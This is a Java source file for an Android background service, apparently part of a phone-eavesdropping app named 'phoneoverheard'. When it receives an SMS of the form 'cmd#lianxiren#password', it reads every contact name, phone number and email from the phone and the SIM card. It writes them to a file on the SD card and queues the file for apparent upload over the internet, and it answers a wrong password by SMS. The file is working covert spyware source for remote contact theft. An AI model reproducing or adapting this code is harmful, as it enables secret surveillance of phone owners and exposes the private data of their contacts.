package com.phoneoverheard.phonne;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendaudio;
import com.phoneoverheard.database.SendaudioService;
import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class lianxirenService extends Service {
    private static final String TAG = "lianxirenService";   
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	Log.i(TAG, "onStart called."); 
    	mylog.WrLog("i",TAG,"开始获取联系人信息。");
		String filecontext = "";
		String ContectsInfo = "";
		String SIMContectsInfo = "";
        Bundle smscontent = intent.getBundleExtra("smscontent");// 根据bundle的key得到对应的对象
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("lianxiren").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("lianxiren") && new FileService().MD5(contents[2]).equals(password)){
			ContectsInfo = readContects(getBaseContext());
			SIMContectsInfo = readSIMContects(getBaseContext());
			filecontext = ContectsInfo+"/n"+SIMContectsInfo;
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String filedir = manager.getAudiofolder();
			String fileurl = filedir+"lianxiren"+receiveTime+".txt";
			//将数据写入SD卡文件中
	        FileService FileService = new FileService();	        
			try {
		    	if(new File(filedir).exists()){
		    		FileService.saveToSDCard(filedir,"lianxiren"+receiveTime+".txt", filecontext,getBaseContext());
		    	}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			File file = new File(fileurl);
			SendaudioService sendaudioservice = new SendaudioService(getBaseContext());
			Sendaudio sendaudio = new Sendaudio(0,file.length(),receiveTime,fileurl,"lianxiren"+receiveTime+".txt");
			sendaudioservice.insert(sendaudio);
			Log.i(TAG, 0+" "+file.length()+" "+receiveTime+" "+fileurl);
			mylog.WrLog("i",TAG,0+" "+file.length()+" "+receiveTime+" "+fileurl);
			new FileService().CheckConnectInternet(file,getBaseContext());		
		}else{
			// 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "密码错误！";
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
		onDestroy();
    } 
	
    /**
     * 功能描述：获取手机中的联系人信息
     * @param context Context类型
     * @return PhoneContacts 手机中的联系人信息
     */
	public String readContects(Context context) {
		mylog.WrLog("i",TAG,"获取手机中的联系人信息");
        String PhoneContacts = null;
        ContentResolver cr = context.getContentResolver();        
        Cursor c_name = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        while (c_name.moveToNext()) {
            //获取联系人ID
            String id = c_name.getString(c_name.getColumnIndex(BaseColumns._ID));
            //获取联系人姓名
            String name = c_name.getString(c_name.getColumnIndex(PhoneLookup.DISPLAY_NAME));
            if(PhoneContacts != null){
            	PhoneContacts += name + " ";
            }else{
            	PhoneContacts = name + " ";
            }
            //获取与联系人ID相同的电话号码,可能不止一个
            Cursor c_number = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + id,
                    null, null);
            while (c_number.moveToNext()) {
                String number = c_number
                        .getString(c_number
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA1)); 
                PhoneContacts += number + " ";
            }
            c_number.close();
            //获取与联系人ID相同的电子邮件,可能不止一个
            Cursor c_email = cr.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=" + id,
                    null, null);
            while (c_email.moveToNext()) {
                String email = c_email
                        .getString(c_email
                                .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA1));
                PhoneContacts += email + " ";
            }
            c_email.close();
            PhoneContacts += "\n";
        }
        c_name.close();
        return PhoneContacts;
    }
	
    /**
     * 功能描述：获取SIM卡中的联系人信息
     * @param context Context类型
     * @return SIMContacts 获取SIM手机卡中联系人信息
     */
	public String readSIMContects(Context context) {
		mylog.WrLog("i",TAG,"获取SIM卡中的联系人信息");
        String SIMContacts = null;
        Uri uri = Uri.parse("content://icc/adn");
        ContentResolver cr = context.getContentResolver();        
        Cursor c_name = cr.query(uri, null, null, null, null);        
        if (c_name != null) {
	        while (c_name.moveToNext()) {
	            //获取联系人姓名
	            //String id = c_name.getString(c_name.getColumnIndex("_id"));	
	            //获取联系人姓名
	            String name = c_name.getString(c_name.getColumnIndex("name"));
	            if(SIMContacts != null){
	            	SIMContacts += name + " ";
	            }else{
	            	SIMContacts = name + " ";
	            }
	            //获取与联系人ID相同的电话号码,可能不止一个
	            String number = c_name.getString(c_name.getColumnIndex("number")); 
	            SIMContacts += number + " ";
	            //获取与联系人ID相同的电子邮件,可能不止一个
	            String email = c_name.getString(c_name.getColumnIndex("emails"));
	            if(email != null){
	            	SIMContacts += email + " ";
	            }
	            SIMContacts += "\n";
	        }
        }else{
        	SIMContacts ="不能从'content://icc/adn'读数据\n";
        }
        c_name.close();
        return SIMContacts;
    }

}
